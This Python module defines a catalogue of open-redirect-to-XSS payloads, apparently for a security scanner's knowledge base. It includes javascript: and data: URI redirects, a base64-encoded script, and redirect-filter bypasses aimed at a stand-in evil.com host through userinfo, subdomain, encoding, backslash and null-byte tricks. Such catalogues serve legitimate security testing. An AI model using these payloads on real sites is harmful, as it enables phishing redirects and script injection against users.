#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26

Open Redirect to XSS Payloads
XSS via redirect endpoints
"""

from ..models import PayloadEntry


OPEN_REDIRECT_XSS_DATABASE = {
    # ===== REDIRECT TO JAVASCRIPT =====
    "redirect_js_001": PayloadEntry(
        payload="/redirect?url=javascript:alert(1)",
        contexts=["url", "href"],
        tags=["redirect", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="Redirect to javascript:",
        reliability="high",
    ),
    "redirect_js_002": PayloadEntry(
        payload="/redirect?url=javascript%3Aalert(1)",
        contexts=["url", "href"],
        tags=["redirect", "javascript", "encoded"],
        severity="high",
        cvss_score=7.5,
        description="URL encoded javascript redirect",
        reliability="high",
    ),
    "redirect_js_003": PayloadEntry(
        payload="/redirect?url=//javascript:alert(1)",
        contexts=["url", "href"],
        tags=["redirect", "javascript", "slashes"],
        severity="high",
        cvss_score=7.5,
        description="Double slash javascript redirect",
        reliability="medium",
    ),
    # ===== REDIRECT TO DATA URI =====
    "redirect_data_001": PayloadEntry(
        payload="/redirect?url=data:text/html,<script>alert(1)</script>",
        contexts=["url", "href"],
        tags=["redirect", "data"],
        severity="high",
        cvss_score=7.5,
        description="Redirect to data: URI",
        reliability="medium",
    ),
    "redirect_data_002": PayloadEntry(
        payload="/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        contexts=["url", "href"],
        tags=["redirect", "data", "base64"],
        severity="high",
        cvss_score=7.5,
        description="Redirect to base64 data:",
        reliability="medium",
    ),
    # ===== REDIRECT BYPASS TECHNIQUES =====
    "redirect_bypass_001": PayloadEntry(
        payload="/redirect?url=//evil.com/xss.html",
        contexts=["url", "href"],
        tags=["redirect", "bypass"],
        severity="high",
        cvss_score=7.5,
        description="Protocol-relative redirect",
        reliability="high",
    ),
    "redirect_bypass_002": PayloadEntry(
        payload="/redirect?url=https://evil.com@trusted.com",
        contexts=["url", "href"],
        tags=["redirect", "bypass", "userinfo"],
        severity="high",
        cvss_score=7.5,
        description="Userinfo URL confusion",
        reliability="medium",
    ),
    "redirect_bypass_003": PayloadEntry(
        payload="/redirect?url=https://trusted.com.evil.com",
        contexts=["url", "href"],
        tags=["redirect", "bypass", "subdomain"],
        severity="high",
        cvss_score=7.5,
        description="Subdomain confusion",
        reliability="high",
    ),
    "redirect_bypass_004": PayloadEntry(
        payload="/redirect?url=https://evil.com%2f.trusted.com",
        contexts=["url", "href"],
        tags=["redirect", "bypass", "encoded"],
        severity="high",
        cvss_score=7.5,
        description="Encoded path redirect",
        reliability="medium",
    ),
    "redirect_bypass_005": PayloadEntry(
        payload="/redirect?url=https://evil.com\\@trusted.com",
        contexts=["url", "href"],
        tags=["redirect", "bypass", "backslash"],
        severity="high",
        cvss_score=7.5,
        description="Backslash URL confusion",
        reliability="low",
    ),
    "redirect_bypass_006": PayloadEntry(
        payload="/redirect?url=//evil.com%00.trusted.com",
        contexts=["url", "href"],
        tags=["redirect", "bypass", "null"],
        severity="high",
        cvss_score=7.5,
        description="Null byte redirect",
        reliability="low",
    ),
    # ===== META REFRESH REDIRECT =====
    "redirect_meta_001": PayloadEntry(
        payload='<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        contexts=["html_content"],
        tags=["redirect", "meta", "refresh"],
        severity="high",
        cvss_score=7.5,
        description="Meta refresh to javascript",
        reliability="low",
    ),
    # ===== LOCATION HEADER REDIRECT =====
    "redirect_header_001": PayloadEntry(
        payload="Location: javascript:alert(1)",
        contexts=["header"],
        tags=["redirect", "header", "location"],
        severity="high",
        cvss_score=7.5,
        description="Location header javascript",
        reliability="low",
    ),
}

OPEN_REDIRECT_XSS_TOTAL = len(OPEN_REDIRECT_XSS_DATABASE)
